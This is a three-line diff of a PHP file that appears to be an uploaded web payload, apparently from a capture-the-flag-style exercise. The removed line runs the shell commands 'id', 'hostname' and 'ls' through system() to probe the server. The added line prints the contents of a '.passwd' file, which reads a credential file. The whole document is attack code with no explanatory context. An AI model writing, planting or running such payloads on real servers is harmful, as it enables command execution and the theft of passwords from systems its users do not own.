@@ -1,3 +1,3 @@
 <?php
-system('id && hostname && ls');
+echo file_get_contents(".passwd");
 ?>
